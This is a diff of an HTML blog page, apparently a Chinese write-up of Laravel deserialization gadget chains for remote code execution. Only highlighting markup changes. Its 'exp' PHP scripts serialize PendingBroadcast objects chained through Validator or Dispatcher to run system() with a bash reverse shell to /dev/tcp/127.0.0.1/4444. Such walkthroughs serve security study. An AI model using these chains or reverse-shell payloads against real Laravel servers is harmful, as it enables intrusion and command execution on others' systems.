-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callClassBasedExtension</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">callExtension</span><span class="p">(</span><span class="nv">$rule</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$callback</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span><span class="p">[</span><span class="nv">$rule</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_callable</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callClassBasedExtension</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这里更是没有什么过滤，干就van了</p>
 <p>exp</p>
@@ -598,33 +598,33 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Illuminate\Validation</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Validator</span><span class="p">{</span>
-		<span class="k">public</span> <span class="nv">$extensions</span> <span class="o">=</span> <span class="p">[];</span>
-		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$extensions</span><span class="p">){</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span> <span class="o">=</span> <span class="nv">$extensions</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span><span class="p">{</span>
-	<span class="nv">$validator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Validation\Validator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;system&#34;</span><span class="p">));</span>
-	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$validator</span><span class="p">,</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Validation</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Validator</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nv">$extensions</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$extensions</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span> <span class="o">=</span> <span class="nv">$extensions</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$validator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Validation\Validator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;system&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$validator</span><span class="p">,</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="rce3"><a href="#rce3" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:rce3" class="headings">rce3</a></h3>
 <blockquote>
@@ -641,11 +641,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>参数均可控，接下来找同名方法，找到<code>Illuminate\Bus\Dispatcher</code></p>
 <p><code>Illuminate\Bus\Dispatcher::dispatch</code></p>
@@ -661,15 +661,15 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">dispatch</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">commandShouldBeQueued</span><span class="p">(</span><span class="nv">$command</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dispatchToQueue</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dispatchNow</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">dispatch</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">commandShouldBeQueued</span><span class="p">(</span><span class="nv">$command</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dispatchToQueue</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dispatchNow</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>看一下commandShouldBeQueued方法</p>
 <p><code>$this-&gt;commandShouldBeQueued($command)</code></p>
@@ -681,11 +681,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">commandShouldBeQueued</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nv">$command</span> <span class="nx">instanceof</span> <span class="nx">ShouldQueue</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">commandShouldBeQueued</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$command</span> <span class="nx">instanceof</span> <span class="nx">ShouldQueue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可知条件是queueResolver有值且command是接口ShouldQueue的实例，queueResolver值可控，因此有值的要求很简单。众所周知，接口不能实例化，因此我们只能寻找实现了接口的类从而通过实例判断。然后找到了<code>Illuminate\Broadcasting\BroadcastEvent</code>，经过条件判断后会调用方法<strong>dispatchToQueue</strong></p>
 <p><code>Illuminate\Bus\Dispatcher::dispatchToQueue</code></p>
@@ -709,23 +709,23 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">dispatchToQueue</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$connection</span> <span class="o">=</span> <span class="nv">$command</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
-
-    <span class="nv">$queue</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span><span class="p">,</span> <span class="nv">$connection</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$queue</span> <span class="nx">instanceof</span> <span class="nx">Queue</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;Queue resolver did not return a Queue implementation.&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="s1">&#39;queue&#39;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$command</span><span class="o">-&gt;</span><span class="na">queue</span><span class="p">(</span><span class="nv">$queue</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pushCommandToQueue</span><span class="p">(</span><span class="nv">$queue</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">dispatchToQueue</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$connection</span> <span class="o">=</span> <span class="nv">$command</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$queue</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span><span class="p">,</span> <span class="nv">$connection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$queue</span> <span class="nx">instanceof</span> <span class="nx">Queue</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;Queue resolver did not return a Queue implementation.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="s1">&#39;queue&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$command</span><span class="o">-&gt;</span><span class="na">queue</span><span class="p">(</span><span class="nv">$queue</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pushCommandToQueue</span><span class="p">(</span><span class="nv">$queue</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>存在敏感函数，由于两个参数都可控，直接就能命令执行（后面的报错就别管了，弹个shell还是可以的</p>
 <p>exp</p>
@@ -769,43 +769,43 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Illuminate\Bus</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Dispatcher</span><span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$queueResolver</span><span class="p">;</span>
-		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$queueResolver</span><span class="p">){</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span> <span class="o">=</span> <span class="nv">$queueResolver</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">BroadcastEvent</span><span class="p">{</span>
-		<span class="k">public</span> <span class="nv">$connection</span><span class="p">;</span>
-		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$connection</span><span class="p">){</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="nv">$connection</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span><span class="p">{</span>
-	<span class="nv">$dispatch</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Bus\Dispatcher</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">);</span>
-	<span class="nv">$command</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\BroadcastEvent</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$dispatch</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
-	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Bus</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Dispatcher</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$queueResolver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$queueResolver</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span> <span class="o">=</span> <span class="nv">$queueResolver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">BroadcastEvent</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nv">$connection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$connection</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="nv">$connection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dispatch</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Bus\Dispatcher</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$command</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\BroadcastEvent</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$dispatch</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="rce4"><a href="#rce4" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:rce4" class="headings">rce4</a></h3>
 <blockquote>
@@ -827,15 +827,15 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hasExecuted</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
